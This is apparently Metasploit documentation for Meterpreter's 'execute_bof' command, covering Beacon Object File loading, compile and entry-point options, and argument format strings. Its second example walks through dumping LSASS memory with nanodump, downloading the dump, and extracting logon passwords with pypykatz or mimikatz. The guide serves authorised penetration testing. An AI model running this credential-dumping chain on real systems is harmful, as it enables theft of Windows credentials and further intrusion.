This guide outlines how to use the Meterpreter `execute_bof` command as provided by the `bofloader` extension. It allows
a Meterpreter session to execute "Beacon Object Files" or BOF files for short. A BOF is a
[Common Object File Format][1] (COFF) executable file with an API of standard functions defined in [beacon.h][2].

The `bofloader` extension is only available for the Windows native Meterpreter, i.e. it is unavailable in the Java
Meterpreter even when running on the Windows platform.

# Execution Environment
**Warning:** The execution environment is shared with the Meterpreter process. If there is an exception or the BOF
crashes, the Meterpreter session will die. It is suggested that users invoke this functionality through a dedicated
session to avoid losing access altogether.

The loader and execution environment are provided by [trustedsec/COFFLoader][3]. The extension is therefore subject to
the same limitations.

The following functions are unavailable:

* `BeaconDataPtr`
* `BeaconUseToken`<sup>1</sup>
* `BeaconRevertToken`<sup>1</sup>
* `BeaconIsAdmin`
* `BeaconInjectProcess`
* `BeaconInjectTemporaryProcess`

<sup>1</sup> The token functions are defined and present, but will only effect the execution of the BOF and not the
Meterpreter runtime environment.

Currently, there is only one output stream. All output data processed by `BeaconOutput` and `BeaconPrintf` is combined
into that stream. BOFs should not use this for outputting binary data.

# Usage
The `bofloader` extension provides exactly one command, through which all of the provided functionality is accessed.

`execute_bof </path/to/bof_file> [Options] -- [BOF Arguments]`

* `-c` / `--compile` -- Compile the input file (requires mingw).
* `-e` / `--entry` -- The entry point (default: `go`).
* `-f` / `--format-string` -- Argument format-string. See details below.

## Compile
The compile option will use a local mingw instance to compile the input file into a COFF file for execution. The
standard [beacon.h][2] file will be in the include path automatically. In this case, the input file is treated as a C
source file instead of compiled data.

## Entry Point
Once loaded the loader will call the BOF entry point. By default, this value is `go`. The entry point option can change
it to another valid function to call instead.

## Argument Format-String
The `execute_bof` command is capable of serializing arguments to be sent to the BOF for execution. The user must define
the data type of each argument that the BOF file expecting to see. This information would come from either reading the
BOF's documentation or source code. **Incorrectly specifying the arguments or omitting them entirely can result in the
BOF crashing and the Meterpreter session dying.**

BOF argument types are defined in the format string argument with `-f` / `--format-string`.

The following table describes each of the types.

| Type    | Description                                                     | Unpack With (C)               |
| --------|-----------------------------------------------------------------|-------------------------------|
| b       | binary data (e.g. 01020304, file:/path/to/file.bin)<sup>1</sup> | BeaconDataExtract             |
| i       | 32-bit integer (e.g. 0x1234, 5678)<sup>2</sup>                  | BeaconDataInt                 |
| s       | 16-bit integer (e.g. 0x1234, 5678)<sup>2</sup>                  | BeaconDataShort               |
| z       | null-terminated utf-8 string                                    | BeaconDataExtract             |
| Z       | null-terminated utf-16 string                                   | (wchar_t *)BeaconDataExtract  |

<sup>1</sup> Binary data arguments are specified as either a stream of hex characters or as the path to a file local to
the Metasploit Framework instance. In the case of a file path, it must be prefixed with `file:`.

<sup>2</sup> Integer arguments are specified as either decimal or hexadecimal literals.

Unknown arguments are treated as BOF arguments. Additionally, any arguments after the `--` terminator are explicitly
treated as BOF arguments. Using the terminator allows ambiguous arguments to such as `--help` to be forward to the BOF
instead of being processed locally. The number of BOF arguments to be forward must equal number of characters in the
argument format string.

# Usage Examples
Executing [dir][4], passing the path argument and number of sub-directories to list.

```msf
meterpreter > execute_bof CS-Situational-Awareness-BOF/SA/dir/dir.x64.o --format-string Zs C:\\ 0
Contents of C:\*:
	08/05/2022 15:17           <dir> $Recycle.Bin
	08/05/2022 15:16      <junction> Documents and Settings
	09/22/2022 08:35      1342177280 pagefile.sys
	08/05/2022 16:48           <dir> PerfLogs
	09/08/2022 12:51           <dir> Program Files
	09/15/2018 05:06           <dir> Program Files (x86)
	08/05/2022 15:26           <dir> ProgramData
	09/07/2022 10:24           <dir> Python27
	08/05/2022 15:16           <dir> Recovery
	08/05/2022 15:40           <dir> System Volume Information
	08/05/2022 15:16           <dir> Users
	09/01/2022 13:49           <dir> Windows
	                      1342177280 Total File Size for 1 File(s)
	                                                     11 Dir(s)

meterpreter > 
```

Executing [nanodump][5]. First the PID of LSASS is found, then the argument string is constructed. The output must be
written to disk. Once completed, the dump file can be downloaded from the remote host.

```msf
meterpreter > ps lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User                 Path
 ---  ----  ----       ----  -------  ----                 ----
 712  556   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > execute_bof nanodump.x64.o --format-string iziiiiiiiiziiiz 712 nanodump.dmp 1 1 0 0 0 0 0 0 "" 0 0 0 ""
Done, to download the dump run:
download nanodump.dmp
to get the secretz run:
python3 -m pypykatz lsa minidump nanodump.dmp
mimikatz.exe "sekurlsa::minidump nanodump.dmp" "sekurlsa::logonPasswords full" exit
meterpreter > download nanodump.dmp 
[*] Downloading: nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 1.00 MiB of 11.56 MiB (8.65%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 2.00 MiB of 11.56 MiB (17.31%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 3.00 MiB of 11.56 MiB (25.96%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 4.00 MiB of 11.56 MiB (34.62%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 5.00 MiB of 11.56 MiB (43.27%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 6.00 MiB of 11.56 MiB (51.92%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 7.00 MiB of 11.56 MiB (60.58%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 8.00 MiB of 11.56 MiB (69.23%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 9.00 MiB of 11.56 MiB (77.89%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 10.00 MiB of 11.56 MiB (86.54%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 11.00 MiB of 11.56 MiB (95.2%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 11.56 MiB of 11.56 MiB (100.0%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] download   : nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
meterpreter > 
```

# References

* [hstechdocs.helpsystems.com/manuals/cobaltstrike][6] for Cobalt Strike's BOF documentation
* [beacon.h][2] source code for the BOF API
* [TrustedSec/COFFLoader][3] for the source code of the loader
* [trustedsec/CS-Situational-Awareness-BOFF][7] for a collection of useful BOFs

[1]: https://en.wikipedia.org/wiki/COFF
[2]: https://github.com/Cobalt-Strike/bof_template/blob/4a5009fc4adeb35bb1b1887da478280f12f9693a/beacon.h
[3]: https://github.com/TrustedSec/COFFLoader
[4]: https://github.com/trustedsec/CS-Situational-Awareness-BOF/tree/master/src/SA/dir
[5]: https://github.com/helpsystems/nanodump
[6]: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm
[7]: https://github.com/trustedsec/CS-Situational-Awareness-BOF
